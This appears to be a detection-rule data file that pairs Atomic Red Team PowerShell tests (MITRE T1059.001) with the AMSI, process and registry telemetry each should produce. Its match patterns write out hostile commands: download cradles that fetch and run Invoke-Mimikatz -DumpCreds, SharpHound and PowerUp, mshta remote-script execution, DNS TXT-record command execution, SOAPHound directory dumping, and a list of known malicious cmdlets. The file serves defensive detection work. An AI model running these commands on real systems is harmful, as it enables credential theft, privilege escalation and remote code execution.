T1059.001,windows,f3132740,Mimikatz
ARG,mimurl,https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
_E_,AMSI,scan_content~=IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds

T1059.001,windows,a21bb23e,Run BloodHound from local disk
_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp

T1059.001,windows,bf8c1441,Run Bloodhound from Memory using Download Cradle
_E_,AMSI,scan_content~=IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
_E_,AMSI,scan_content~=Invoke-BloodHound -OutputDirectory $env:Temp

T1059.001,windows,af1800cf,Mimikatz - Cradlecraft PsSendKeys
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=iWindowPosY
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=iWindowPosDY
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=iWindowPosDX
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=iWindowPosY
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=iWindowPosX
_E_,REG,event_type~=SETVALUEKEY,key_name~=SOFTWARE\Microsoft\Notepad,value_name=StatusBar

T1059.001,windows,06a220b6,Invoke-AppPathBypass
_E_,AMSI,"scan_content~=IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"

T1059.001,windows,388a7340,Powershell MsXml COM object - with prompt
ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
_E_,AMSI,"scan_content~=$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"

T1059.001,windows,4396927f,Powershell XML requests
ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
_E_,AMSI,"scan_content~=$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"

T1059.001,windows,8a2ad40b,Powershell invoke mshta.exe download
ARG,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
_E_,Process,cmdline~=mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()

T1059.001,windows,fa050f5e,PowerShell Fileless Script Execution
_E_,REG,event_type~=CREATEKEY,key_name~=AtomicRedTeam
_E_,REG,event_type~=SETVALUEKEY,key_name~=AtomicRedTeam,value_name~=ART

T1059.001,windows,8e5c5532,NTFS Alternate Data Stream Access
ARG,ads_file,$env:TEMP\NTFS_ADS.txt
_E_,AMSI,scan_content~=Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
_E_,AMSI,scan_content~=$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
_E_,AMSI,scan_content~=Invoke-Expression $streamcommand

T1059.001,windows,7c1acec2,PowerShell Session Creation and Use
FYI,PreReq command: Enable-PSRemoting fails
ARG,hostname_to_connect,$env:COMPUTERNAME
_E_,Process,cmdline~=New-PSSession -ComputerName #{hostname_to_connect}
_E_,Process,cmdline~=Test-Connection $env:COMPUTERNAME
_E_,Process,cmdline~=Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
_E_,Process,cmdline~=Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
_E_,Process,cmdline~=Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use

T1059.001,windows,686a9785,ATHPowerShellCommandLineParameter -Command parameter variations
ARG,command_line_switch_type,Hyphen
ARG,command_param_variation,C
_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop

T1059.001,windows,1c0a870f,ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
ARG,command_line_switch_type,Hyphen
ARG,command_param_variation,C
ARG,encoded_arguments_param_variation,EA
_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop

T1059.001,windows,86a43bad,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
ARG,command_line_switch_type,Hyphen
ARG,encoded_command_param_variation,E
_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop

T1059.001,windows,0d181431,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
ARG,encoded_arguments_param_variation,EncodedArguments
ARG,encoded_command_param_variation,E
ARG,command_line_switch_type,Hyphen
_E_,AMSI,scan_content~=Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop

T1059.001,windows,a538de64,PowerShell Command Execution
ARG,obfuscated_code,JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
_E_,Process,cmdline~=powershell.exe -e #{obfuscated_code}

T1059.001,windows,49eb9404,PowerShell Invoke Known Malicious Cmdlets
ARG,"Malicious_cmdlets,"Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword", "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot", "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection", "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan", "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode", "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy", "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy", "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump", "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy", "Set-CriticalProcess", "Set-MasterBootRecord""
_E_,AMSI,scan_content~=foreach ($cmdlets in $malcmdlets) {
_E_,AMSI,scan_content~=$cmdlets}

T1059.001,windows,1289f78d,PowerUp Invoke-AllChecks
_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
_E_,AMSI,scan_content~=iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
_E_,AMSI,scan_content~=Invoke-AllChecks

T1059.001,windows,999bff6d,Abuse Nslookup with DNS Records
_E_,AMSI,"scan_content~=powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]"

T1059.001,windows,6a5b2a50,SOAPHound - Dump BloodHound Data
ARG,soaphound_path,PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
ARG,user,$env:USERNAME
ARG,password,P@ssword1
ARG,domain,$env:USERDOMAIN
ARG,dc,10.0.1.14
ARG,cachefilename,c:\temp\cache.txt
ARG,outputdirectory,c:\temp\test2
_E_,AMSI,scan_content~=SOAPHound.exe --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}

T1059.001,windows,4099086c,SOAPHound - Build Cache
ARG,user,$env:USERNAME
ARG,password,P@ssword1
ARG,domain,$env:USERDOMAIN
ARG,dc,10.0.1.14
ARG,cachefilename,c:\temp\cache.txt
ARG,soaphound_path,PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
_E_,AMSI,scan_content~=SOAPHound.exe --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}